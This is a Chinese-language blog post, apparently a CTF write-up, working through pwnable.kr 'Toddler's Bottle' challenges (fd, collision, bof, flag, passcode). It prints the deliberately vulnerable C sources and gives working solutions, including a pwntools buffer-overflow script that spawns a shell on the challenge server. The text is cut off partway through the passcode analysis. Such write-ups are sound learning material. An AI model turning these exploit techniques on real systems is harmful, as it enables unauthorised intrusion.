@@ -1,0 +1,1710 @@
+<!DOCTYPE html>
+<html lang="">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="HackPluto">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="HackPluto">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content>
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>HackPluto&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/favicon.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">HackPluto&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">HackPluto's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/2.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">4.4k</span>阅读时长: <span class="post-count reading-time">20 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/03/11</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>在网上发现了一个pwn的题库，页面非常的可爱，所以就做了下，在这里记录下做题的过程。<br>题目网址是：<a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a><br>页面是不是非常可爱<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-11下午4.20.45.png" alt></p>
+<h1 id="Toddler’s-Bottle"><a href="#Toddler’s-Bottle" class="headerlink" title="Toddler’s Bottle"></a>Toddler’s Bottle</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>首先是第一题，和文件描述符有关<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311162453.png" alt></p>
+<h3 id="文件描述符"><a href="#文件描述符" class="headerlink" title="文件描述符"></a>文件描述符</h3><p>Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。</p>
+<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul>
+<li>每个文件描述符会与一个打开的文件相对应</li>
+<li>不同的文件描述符也可能指向同一个文件</li>
+<li>相同的文件可以被不同的进程打开，也可以在同一个进程被多次打开</li>
+</ul>
+<p>系统为维护文件描述符，建立了三个表<br><img src="https://segmentfault.com/img/bVOX3l?w=619&amp;h=312" alt><br><img src="https://segmentfault.com/img/bVOX3m?w=617&amp;h=392" alt><br>查看flag文件发现没有权限<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311172551.png" alt><br>查看C源文件<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">        <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>read函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> * buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure></p>
+<p>其中第一个参数fd，就是文件描述符，如果是0的话，就表示从键盘输入<br>Atoi接收的参数我们可以控制，只要令argv[1]为0x1234（argv[0]为程序名称，argv[1]为输入参数），0x1234十进制为4660，经过运算最后赋值给fd的就是0，然后再传入read()，由于fd为0，所以我们在命令行中输入什么，则在buffer中写入的就是什么，只要输入LETMEWIN就可以了<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311173758.png" alt></p>
+<h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个题代码很简单，注意点是两个：</p>
+<ul>
+<li>输入长度必须刚好20字节</li>
+<li>小端序输入</li>
+</ul>
+<p>就是输入一个20字节的字符串，然后转换成int类型数据，4个字节一个数，把这五个数加起来刚好等于hashcode就好<br>那就按着题目大意来<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-11下午7.04.19.png" alt><br>先把a,b求出来<br>然后在对程序进行输入的时候需要注意，我们怎么把这个20字节的字符串输入呢，因为很多是不可见字符靠键盘输入是不行的，这里介绍一个Linux shell的特殊符号: ` 就是Tab键上面那个符号，Linux shell对 ` 符号包裹起来的字符串会当作命令去执行,这样我们就可以python的输出作为这个程序的参数<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./col `python -c 'print "\xc8\xce\xc5\x06" * 4 + "\xcc\xce\xc5\x06"'`</span><br></pre></td></tr></table></figure></p>
+<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><p>题目源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>简单的栈溢出</p>
+<p><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-11下午7.26.31.png" alt><br>计算一下溢出点到ebp+0x8的距离<br>写出payload<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">"A"</span>*<span class="number">0x34</span>,<span class="number">0xcafebabe</span>])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311202841.png" alt></p>
+<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>首先去IDA里反汇编发现解析不了符号表，所以猜测程序进行了加壳，使用Linux的strings命令查看二进制文件的字符串，发现了UPX，所以这是一个UPX壳<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311211948.png" alt></p>
+<p><a href="https://upx.github.io/" target="_blank" rel="noopener">UPX的脱壳工具</a><br>进行脱壳后如下：<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311211908.png" alt><br>重新反汇编，可以正常解析<br>进行GDB调试的时候发现了一个注释是flag</p>
+<p><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311211807.png" alt><br>打印出这个地址</p>
+<p><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/20200311231543.png" alt></p>
+<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>先看一下源码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>明显这两句是有问题的<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br></pre></td></tr></table></figure></p>
+<p>因为scanf要求传入的是一个指针，这里传入的是一个int型变量，结果调试的时候发现变量里的值竟然还是合法地址，那么怎么利用呢，这个题是没有溢出的<br>利用的地方就是welcome函数<br>这里的输入在栈上，而welcome和login用的是栈基本是一个地方，所以我们可以通过提前在栈上将passcode1,2的地址上填充自己的地址，这样就可以让scanf函数正常工作，但是调试的时候发现<br><img src="https://raw.githubusercontent.com/HackPluto/bokepicture/master/bokeimg/截屏2020-03-11下午11.58.30.png" alt><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name数组首地址是 <span class="number">0xffffce18</span></span><br><span class="line">passcode1      <span class="number">0xffffce78</span></span><br><span class="line">passcode2      <span class="number">0xffffce7c</span></span><br></pre></td></tr></table></figure></p>
